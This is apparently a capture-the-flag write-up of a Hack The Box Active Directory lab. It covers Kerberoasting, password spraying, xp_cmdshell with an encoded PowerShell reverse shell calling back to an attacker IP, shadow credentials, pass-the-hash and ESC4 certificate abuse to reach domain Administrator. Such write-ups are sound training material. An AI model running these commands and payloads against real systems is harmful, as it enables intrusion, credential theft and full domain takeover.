LDAP        10.10.11.51     389    DC01             sAMAccountName: sql_svc memberOf: CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb pwdLastSet: 2024-06-09 03:58:42.689521 lastLogon:2025-04-20 10:58:13.616578
LDAP        10.10.11.51     389    DC01             $krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$c2139fcc821cb64c4eadd453f904bfd6$abf7719a4677308bf933f529f758474d3025dfc4cd973ad0abdda32a43c506609036c1a4588c0a6d1d320722369a7ad4f6de33ce464a499f4f668a011afc9a15a027f0d0ee38128124d8bfaa16f8b4854f15a5f82e8c6bd00db13ee1d25aec94655962a409be46e1bd707529606cf0afbe79897e69b1f156638b0308a3c6ebe99ff21d50e4430455f0ba0e6167ca0d4c3da50b6a9261a8e3d72dce893c5cf622704b5bedf4eadec13264edb47eef6dc81c15ccb66e20a2edd8f263e6105f52b3f23193d597b379c7b139d32348004b549a43acb59cba4b2226e5cb8dd4f941df37883e5ff9c37d0a1e8cf8082d4d03735e37431ad3e771eeb8ef8f9a8fa8f40422b8f48276e33dcd99b641b408df39145a753cdf9f6f937f578b73b47a2c10fff1d33d276038348ede3b4e2ba533b22e394c6740e23a4545691d1318d44bdaaa613d8fa13c73ba20bb94bd4bfe93f2d730d9ba86548b4fca137965d03ed46299889c267782b759ad5b52f0ae18834fc95f6c08dabb7e6f73fcd7513906181a735568175634b3d7b24dccd15f5e9f95b94388c1040049bf593c8d9c7821a07772d8cfb6f54bae14c41a9a3b4d16552e5399c7e3feb0d45457e42c6406ae64522906cfbaf1f34811e0876afc8fe60a8cd2dc9ec3b5343a47e11cf6b4814e80bbfe79e1607c97ddb292749b3b957220b955819fdd5044e47948523131b187c80b00161b55a2056f929823190db79e332da245a7e4230f43bd4ebf6698d8f7812962576fc7dd4c4b8bad190047b85708021c080f33367379ebae78da446408b503055e339db9384e1b17020fed24b3d2b50cba3f0a36c7185525238e6e27147d27e3fe84aa4f4f04fd967fa1b30ffb53699d6ccc63609f9aa1e0f00387646e9596f2dac557c9f6b2f90e8ec9cc79d593fd2c7d7dffee01ad5d64df56ab1e94b97d26345af4bf5f3aa3a0805282c69b5628f126b9239d40320721e950ae2bc1776041859803ddaf3d6fec8ebc62dc0bf2ce37002e9958b6803fa517e1a8c927a7d23eebdf858715743a4c0420ac21133500dddff5aef00420c8c6f8d15d8f5ab4b93a9ccbcb0c1ae221c34826fdb2107a58baf23aed74295efcd01dfcd8bb6017c1f17adcc189bc32762eae8eb66536b02d6732ba26babb608114ee964848dc5538c9f9ccbaf070544bbbd8313a6e845c1436162602bbd9c4b75fdadd19fd71303f1e4c4a41c99a60590cec655e8d3a3a9e12746eba79863c87224a3f75b7eaa83112f4bcb24d74b83f8c8fcea0bc2d593c25438cd7bef02389fdb8d29ba5086eda00843a7e36bdfb99c60922ae7dca806f5bc7d0f16a24287895b86ff7631338040846dec19a3e3bb56961e15b84485494f153870f21064c91ebbdd8ecd053b136cf55c88884f09ab5f7fbd9e6827f6507  
```

what is kerbroasting:
```
Kerberoasting is a cyberattack that targets the Kerberos authentication protocol, primarily used in Windows networks, to steal service account credentials. Attackers exploit 
this method by requesting service tickets and then attempting to crack the encrypted passwords offline, allowing them to gain unauthorized access to network resources
```

what is asreproast:
```
AS-REP Roasting is a type of attack that targets user accounts in a Kerberos authentication system that do not require pre-authentication. 
This vulnerability allows attackers to extract encrypted credentials, which can then be cracked offline to reveal user passwords
```

cant crack the hash found with Kerberoasting


# Bloodhound

lets run blood hound on the DC

```bash
bloodhound-python -d sequel.htb -ns 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' -c all

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.sequel.htb:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 06S
```

we get an inside view of the domain


# SMB

lets enumerate the SMB shares

```bash
nxc smb -u 'rose' -p 'KxEPkKe6R8su' --shares sequel.htb

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ    
```

lets enumerate some users

```bash
nxc smb sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --users  

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.51     445    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain 
SMB         10.10.11.51     445    DC01             Guest                         2024-12-25 14:44:53 0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.51     445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account 
SMB         10.10.11.51     445    DC01             michael                       2024-06-08 16:47:37 0        
SMB         10.10.11.51     445    DC01             ryan                          2024-06-08 16:55:45 0        
SMB         10.10.11.51     445    DC01             oscar                         2024-06-08 16:56:36 0        
SMB         10.10.11.51     445    DC01             sql_svc                       2024-06-09 07:58:42 0        
SMB         10.10.11.51     445    DC01             rose                          2024-12-25 14:44:54 0        
SMB         10.10.11.51     445    DC01             ca_svc                        2025-04-20 15:07:47 0        
SMB         10.10.11.51     445    DC01             [*] Enumerated 9 local users: SEQUEL

```

nice , lets download all the file in the share Accounting Department localy

```bash
recurse ON
prompt OFF
mget *
```

i got some problem opening the excel so i extracted with binwalk and got this data

```html
<sst count="25" uniqueCount="24">
	<si>
		<t xml:space="preserve">First Name</t>
	</si>
	<si>
		<t xml:space="preserve">Last Name</t>
	</si>
	<si>
		<t xml:space="preserve">Email</t>
	</si>
	<si>
		<t xml:space="preserve">Username</t>
	</si>
	<si>
		<t xml:space="preserve">Password</t>
	</si>
	<si>
		<t xml:space="preserve">Angela</t>
	</si>
	<si>
		<t xml:space="preserve">Martin</t>
	</si>
	<si>
		<t xml:space="preserve">angela@sequel.htb</t>
	</si>
	<si>
		<t xml:space="preserve">angela</t>
	</si>
	<si>
		<t xml:space="preserve">0fwz7Q4mSpurIt99</t>
	</si>
	<si>
		<t xml:space="preserve">Oscar</t>
	</si>
	<si>
		<t xml:space="preserve">Martinez</t>
	</si>
	<si>
		<t xml:space="preserve">oscar@sequel.htb</t>
	</si>
	<si>
		<t xml:space="preserve">oscar</t>
	</si>
	<si>
		<t xml:space="preserve">86LxLBMgEWaKUnBG</t>
	</si>
	<si>
		<t xml:space="preserve">Kevin</t>
	</si>
	<si>
		<t xml:space="preserve">Malone</t>
	</si>
	<si>
		<t xml:space="preserve">kevin@sequel.htb</t>
	</si>
	<si>
		<t xml:space="preserve">kevin</t>
	</si>
	<si>
		<t xml:space="preserve">Md9Wlq1E5bZnVDVo</t>
	</si>
	<si>
		<t xml:space="preserve">NULL</t>
	</si>
	<si>
		<t xml:space="preserve">sa@sequel.htb</t>
	</si>
	<si>
		<t xml:space="preserve">sa</t>
	</si>
	<si>
		<t xml:space="preserve">MSSQLP@ssw0rd!</t>
	</si>
</sst>
```

lets try some of this user and passwords

```bash
nxc smb sequel.htb -u user -p passwd --shares --continue-on-success

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
```

found some good credentials

> oscar:86LxLBMgEWaKUnBG

seems he cant winrm the machine

lets connect to the MS-SQL with the credentials found


# MSSQL

lets try the credentials found

```bash
nxc mssql sequel.htb -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth

MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```

nice , lets connect with impacket mssqlclient module

```bash
impacket-mssqlclient sa@sequel.htb        

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:MSSQLP@ssw0rd!
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

since we are admin we can enable manualy the XP_cmdshell

```
-- Enable advanced options
sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

but since we are using impacket we can just write

```
enable_xp_cmdshell
RECONFIGURE
```

now that we enable xp_cmdshell lets get a reverse shell with RCE

```
SQL (sa  dbo@master)> EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA4ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';

```

after looking around i found the password of the user hardcoded in the SQL config file

```
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

after looking around in the box i dint found nothing , lets try some password Spraying with the SQL_SVC password

```bash
nxc ldap sequel.htb -u user -p passwd --continue-on-success

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\kevin:0fwz7Q4mSpurIt99 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\sa:0fwz7Q4mSpurIt99 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\micheal:0fwz7Q4mSpurIt99 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\sql_svc:0fwz7Q4mSpurIt99 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ca_svc:0fwz7Q4mSpurIt99 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\angela:86LxLBMgEWaKUnBG 
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\kevin:86LxLBMgEWaKUnBG 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\sa:86LxLBMgEWaKUnBG 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\micheal:86LxLBMgEWaKUnBG 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\sql_svc:86LxLBMgEWaKUnBG 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ca_svc:86LxLBMgEWaKUnBG 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\angela:Md9Wlq1E5bZnVDVo 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\micheal:Md9Wlq1E5bZnVDVo 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\sql_svc:Md9Wlq1E5bZnVDVo 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ca_svc:Md9Wlq1E5bZnVDVo 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\angela:MSSQLP@ssw0rd! 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\kevin:MSSQLP@ssw0rd! 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\micheal:MSSQLP@ssw0rd! 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ryan:MSSQLP@ssw0rd! 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\sql_svc:MSSQLP@ssw0rd! 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ca_svc:MSSQLP@ssw0rd! 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\angela:WqSZAF6CysDQbGb3 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\kevin:WqSZAF6CysDQbGb3 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\sa:WqSZAF6CysDQbGb3 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\micheal:WqSZAF6CysDQbGb3 
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3 
LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3 

```


# Lateral movment

lets connect to the machine with the credentials found

```bash
evil-winrm -u 'ryan' -p 'WqSZAF6CysDQbGb3' -i sequel.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

after getting the user flag , consulting bloodhound seems we have writing right on ca_svc , lets exploit this making us owner

lets start by garanting us ownership

```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3
```

lets garant ryan full privilage

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3
```

lets add shadow credentials to ca_svc

```bash
pywhisker -d sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3' --target "ca_svc" --action "add" --filename CACert --export PEM
```

lets get the TGT for ca_svc with PKINIT

```bash
gettgtpkinit.py -cert-pem ./CACert_cert.pem -key-pem ./CACert_priv.pem sequel.htb/ca_svc ca_svc.ccache

2025-04-20 16:11:35,891 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-20 16:11:35,899 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-20 16:11:43,427 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-20 16:11:43,427 minikerberos INFO     6ca13d1ed28f05f10c54a39fe368044faf8fb6a8a3fe3876ce7611b4f32d2c9f
INFO:minikerberos:6ca13d1ed28f05f10c54a39fe368044faf8fb6a8a3fe3876ce7611b4f32d2c9f
2025-04-20 16:11:43,429 minikerberos INFO     Saved TGT to file

```

after getting the TGT key lets set it in the enviroment

```bash
export KRB5CCNAME=./ca_svc.ccache
```

lets extract the NThash

```bash
python3 /home/kali/tools/wintools/PKINITtools/getnthash.py -key 6ca13d1ed28f05f10c54a39fe368044faf8fb6a8a3fe3876ce7611b4f32d2c9f sequel.htb/ca_svc

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
3b181b914e7a9d5508ea1e20bc2b7fce
```

nice , now we own ca_svc with PTH method

# Privilage Escalation

after owing ca_svc lets check what certificate are vulnerable

```bash
certipy-ad find -vulnerable -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250420161845_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250420161845_Certipy.txt'
[*] Saved JSON output to '20250420161845_Certipy.json'

```

lets check the file output

```
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions

```

since ESC4 is vulnerable , we can check the certipy repo 

> https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4

```
ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate 
template to make the template vulnerable to ESC1.
```

lets backup the template

```bash
certipy-ad template -username ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -save-old
```

lets request a certificate for the administrator user

```bash
certipy-ad req -username ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51

```

lets get the TGT for the administrator

```bash
certipy-ad auth -pfx administrator.pfx -domain sequel.htb

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

now lets PTH for the administrator account

```bash
evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i sequel.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```



